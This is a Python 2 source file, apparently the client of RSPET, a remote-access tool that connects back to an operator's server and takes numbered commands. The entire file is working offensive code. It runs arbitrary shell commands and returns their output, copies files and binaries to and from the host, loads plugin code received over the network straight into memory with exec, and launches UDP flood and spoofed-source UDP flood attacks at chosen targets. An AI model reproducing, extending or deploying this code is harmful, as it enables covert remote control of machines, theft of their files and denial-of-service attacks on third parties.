#!/usr/bin/env python2
# -*- coding: UTF-8 -*-
"""rspet_client.py: RSPET's Client-side script."""
from __future__ import print_function
from sys import exit as sysexit
from sys import argv, modules
from time import sleep
from subprocess import Popen, PIPE
from multiprocessing import Process, freeze_support
from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
from socket import error as sock_error
from socket import SHUT_RDWR
import ssl

__author__ = "Kolokotronis Panagiotis"
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
__credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas", "Lain Iwakura"]
__license__ = "MIT"
__version__ = "0.4.0"
__maintainer__ = "Kolokotronis Panagiotis"


def exponential_backoff(c_factor):
    """Calculate backoff time for reconnect."""
    return int(((2**c_factor)-1)/2)


def sys_info():
    """Get platform info."""
    import platform
    sys_info_tup = platform.uname()
    return (sys_info_tup[0], sys_info_tup[1])


def get_len(in_string, max_len):
    """Calculate string length, return as a string with trailing 0s.

    Keyword argument(s):
    in_string -- input string
    max_len   -- length of returned string
    """
    tmp_str = str(len(in_string))
    len_to_return = tmp_str
    for _ in range(max_len - len(tmp_str)):
        len_to_return = '0' + len_to_return
    return len_to_return


def udp_flood_start(target_ip, target_port, msg):
    """Create UDP packet and send it to target_ip, target_port."""
    flood_sock = socket(AF_INET, SOCK_DGRAM)
    while True:
        flood_sock.sendto(bytes(msg), (target_ip, target_port))
        sleep(0.01)


def udp_spoof_pck(dest_ip, dest_port, source_ip, source_port, payload):
    """Create and return a spoofed UDP packet.

    Keyword argument(s):
    dest_ip -- the desired destination ip
    dest_port -- the desired destination port
    source_ip -- the desired source ip
    source_port -- the desired source port
    """
    from pinject import UDP, IP
    udp_header = UDP(source_port, dest_port, payload).pack(source_ip, dest_ip)
    ip_header = IP(source_ip, dest_ip, udp_header, IPPROTO_UDP).pack()
    return ip_header+udp_header+payload


def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
    """Spoof a packet and send it to target_ip, target_port.

    Keyword argument(s):
    target_ip -- the desired destination ip
    target_port -- the desired destination port
    spoofed_ip -- the desired source ip
    spoofed_port -- the desired source port
    """
    spoofed_packet = udp_spoof_pck(target_ip, target_port, spoofed_ip,
                                   spoofed_port, payload)
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    while True:
        sock.sendto(spoofed_packet, (target_ip, target_port))
        sleep(0.01)


class Client(object):
    """Class for Client."""
    def __init__(self, addr, port=9000):
        self.sock = socket(AF_INET, SOCK_STREAM)
        try:
            cntx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        except AttributeError: # All PROTOCOL consts are merged on TLS in Python2.7.13
            cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
        self.sock = cntx.wrap_socket(self.sock)
        self.address = addr
        self.port = int(port)
        self.quit_signal = False
        self.version = ("%s-%s" %(__version__, "full"))
        self.plugins = {}
        self.plugin_cmds = {}
        self.comm_dict = {
            '00000' : 'killMe',
            '00001' : 'getFile',
            '00002' : 'getBinary',
            '00003' : 'sendFile',
            '00004' : 'sendBinary',
            '00005' : 'udpFlood',
            '00006' : 'udpSpoof',
            '00007' : 'command',
            '00008' : 'KILL',
            '00009' : 'loadPlugin',
            '00010' : 'unloadPlugin',
            '00011' : 'runPluginCommand'
        }
        self.comm_swtch = {
            'killMe'    : self.kill_me,
            'getFile'   : self.get_file,
            'getBinary' : self.get_binary,
            'sendFile'  : self.send_file,
            'sendBinary': self.send_binary,
            'udpFlood'  : self.udp_flood,
            'udpSpoof'  : self.udp_spoof,
            'command'   : self.run_cm,
            'loadPlugin': self.load_plugin,
            'unloadPlugin': self.unload_plugin,
            'runPluginCommand' : self.run_plugin_cm
        }

    def loop(self):
        """Client's main body. Accept and execute commands."""
        while not self.quit_signal:
            en_data = self.receive(5)
            try:
                en_data = self.comm_dict[en_data]
            except KeyError:
                if en_data == '':
                    self.reconnect()
                continue
            self.comm_swtch[en_data]()
        self.sock.shutdown(SHUT_RDWR)
        self.sock.close()

    def connect(self):
        """Connect to the Server."""
        try:
            self.sock.connect((self.address, self.port))
            ###Send Version###
            msg_len = get_len(self.version, 2) # len is 2-digit (i.e. up to 99 chars)
            en_stdout = self.send(msg_len)
            en_stdout = self.send(self.version)
            ##################
            sys_type, sys_hname = sys_info()
            ###Send System Type###
            msg_len = get_len(sys_type, 2) # len is 2-digit (i.e. up to 99 chars)
            en_stdout = self.send(msg_len)
            en_stdout = self.send(sys_type)
            ######################
            ###Send Hostname###
            if sys_hname == "":
                sys_hname = "None"
            msg_len = get_len(sys_hname, 2) # len is 2-digit (i.e. up to 99 chars)
            en_stdout = self.send(msg_len)
            en_stdout = self.send(sys_hname)
            ###################
        except sock_error, ValueError:
            raise sock_error
        return 0

    def reconnect(self):
        """Attempt to reconnect after connection loss."""
        # Take an exponential backoff-ish approach
        c_factor = 0
        connected = False
        while not connected:
            try:
                self.connect()
            except sock_error:
                sleep(exponential_backoff(c_factor))
                c_factor += 1
            else:
                connected = True

    def send(self, data):
        """Send data to Server."""
        r_code = 0
        try:
            self.sock.send(data)
        except sock_error:
            r_code = 1
            self.reconnect()
        return r_code

    def receive(self, size):
        """Receive data from Server."""
        data = self.sock.recv(size)
        if data == '':
            self.reconnect()
            raise sock_error
        return data

    def kill_me(self):
        """Close socket, terminate script's execution."""
        self.quit_signal = True

    def run_cm(self):
        """Get command to run from server, execute it and send results back."""
        command_size = self.receive(13)
        command = self.receive(int(command_size))
        comm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        stdout, stderr = comm.communicate()
        if stderr:
            decode = stderr.decode('UTF-8')
        elif stdout:
            decode = stdout.decode('UTF-8')
        else:
            decode = 'Command has no output'
        len_decode = get_len(decode, 13)
        en_stdout = self.send(len_decode)
        if en_stdout == 0:
            en_stdout = self.send(decode)
        return 0

    def run_plugin_cm(self):
        """Exeute command defined in a plugin."""
        en_data = self.receive(3) # Plugin command name up to 999 chars
        command = self.receive(int(en_data))
        args = []

        # TODO: Decide if args are handled centrally or by local handler.

        #num_of_args = self.receive(2) # Up to 99 arguments
        #for i in range (0, int(num_of_args)):
        #    en_data = self.receive(2) # Argument up to 99 chars
        #    en_data = self.receive(int(en_data))
        #    args.append(en_data)
        
        self.plugin_cmds[command]['exec'](self, args)

    def get_file(self):
        """Get file name and contents from server, create file."""
        exit_code = 0
        fname_length = self.receive(3) # Filename length up to 999 chars
        fname = self.receive(int(fname_length))
        try:
            file_to_write = open(fname, 'w')
            stdout = 'fcs'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = self.send(stdout)
        else:
            en_stdout = self.send(stdout)
            if en_stdout == 0:
                f_size = self.receive(13) # File size up to 9999999999999 chars
                en_data = self.receive(int(f_size))
                file_to_write.write(en_data)
                file_to_write.close()
                stdout = "fsw"
                en_stdout = self.send(stdout)
            else:
                file_to_write.close()
        return exit_code

    def get_binary(self):
        """Get binary name and contents from server, create binary."""
        exit_code = 0
        bname_length = self.receive(3) # Filename length up to 999 chars
        bname = self.receive(int(bname_length))
        try:
            bin_to_write = open(bname, 'wb')
            stdout = 'fcs'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = self.send(stdout)
        else:
            en_stdout = self.send(stdout)
            if en_stdout == 0:
                b_size = self.receive(13) # Binary size up to 9999999999999 symbols
                en_data = self.receive(int(b_size))
                bin_to_write.write(en_data)
                bin_to_write.close()
                stdout = "fsw"
                en_stdout = self.send(stdout)
            else:
                bin_to_write.close()
        return exit_code

    def send_file(self):
        """Get file name from server, send contents back."""
        exit_code = 0
        fname_length = self.receive(3) # Filename length up to 999 chars
        fname = self.receive(int(fname_length))
        try:
            file_to_send = open(fname, 'r')
            stdout = 'fos'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = self.send(stdout)
        else:
            en_stdout = self.send(stdout)
            if en_stdout == 0:
                file_cont = file_to_send.read()
                file_to_send.close()
                stdout = get_len(file_cont, 13)
                en_stdout = self.send(stdout)
                if en_stdout == 0:
                    stdout = file_cont
                    en_stdout = self.send(stdout)
            else:
                file_to_send.close()
        return exit_code

    def send_binary(self):
        """Get binary name from server, send contents back."""
        exit_code = 0
        bname_length = self.receive(3) # Filename length up to 999 chars
        bname = self.receive(int(bname_length))
        try:
            bin_to_send = open(bname, 'rb')
            stdout = 'fos'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = self.send(stdout)
        else:
            en_stdout = self.send(stdout)
            if en_stdout == 0:
                bin_cont = bin_to_send.read()
                bin_to_send.close()
                stdout = get_len(bin_cont, 13)
                en_stdout = self.send(stdout)
                if en_stdout == 0:
                    stdout = bin_cont
                    en_stdout = self.send(stdout)
            else:
                bin_to_send.close()
        return exit_code

    def udp_flood(self):
        """Get target ip and port from server, start UPD flood wait for 'KILL'."""
        en_data = self.receive(3) # Max ip+port+payload length 999 chars
        en_data = self.receive(int(en_data))
        en_data = en_data.split(":")
        target_ip = en_data[0]
        target_port = int(en_data[1])
        msg = en_data[2]
        proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
        proc.start()
        killed = False
        while not killed:
            en_data = self.receive(5)
            try:
                en_data = self.comm_dict[en_data]
            except KeyError:
                continue
            if en_data == 'KILL':
                proc.terminate()
                killed = True
        return 0

    def udp_spoof(self):
        """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
        en_data = self.receive(3) # Max ip+port+spoofedip+spoofed port+payload length 999 chars
        en_data = self.receive(int(en_data))
        en_data = en_data.split(":")
        target_ip = en_data[0]
        target_port = int(en_data[1])
        spoofed_ip = en_data[2]
        spoofed_port = int(en_data[3])
        payload = en_data[4].encode('UTF-8')
        proc = Process(target=udp_spoof_start, args=(target_ip, target_port,
                                                     spoofed_ip, spoofed_port,
                                                     payload))
        proc.start()
        killed = False
        while not killed:
            en_data = self.receive(5)
            try:
                en_data = self.comm_dict[en_data]
            except KeyError:
                continue
            if en_data == 'KILL':
                proc.terminate()
                killed = True
        return 0

    def load_plugin(self):
        """Zero disk interaction module loading.
        Taken from http://code.activestate.com/recipes/82234-importing-a-dynamically-generated-module/
        Under PSF License.
        Added code licensed under MIT."""
        import imp
        # Get plugin name.
        en_data = self.receive(3) # Max plugin name length 999 chars
        name = self.receive(int(en_data))
        # Get plugin code.
        en_data = self.receive(13) # Max plugin length 99999999999 chars
        code = self.receive(int(en_data))
        module = imp.new_module(name)
        exec code in module.__dict__
        # Add module reference to allow unloading.
        self.plugins[name] = module
        for element in dir(module):
            # Root out "private" fields and already imported commands.
            if not element.startswith("_") and element not in self.plugin_cmds:
                self.plugin_cmds[element] = { 'exec' : getattr(module, element),
                                            'module' : name}

    def unload_plugin(self):
        """Asyncronously unload a plugin."""
        en_data = self.receive(3) # Max plugin name length 999 chars
        en_data = self.receive(int(en_data))
        for com in self.plugin_cmds:
            # Remove module commands.
            if en_data == self.plugin_cmds[com]["module"]:
                self.plugin_cmds.pop(com)
        try:
            del self.plugins[en_data]
        except ImportError:
            pass


def main():
    """Main function. Handle object instances."""
    try:
        rhost = argv[1]
    except IndexError:
        sysexit()
    try:
        myself = Client(rhost, argv[2])
    except IndexError:
        myself = Client(rhost)
    try:
        myself.connect()
    except sock_error:
        myself.reconnect()
    myself.loop()


#Start Here!
if __name__ == '__main__':
    freeze_support()
    Process(target=main).start()
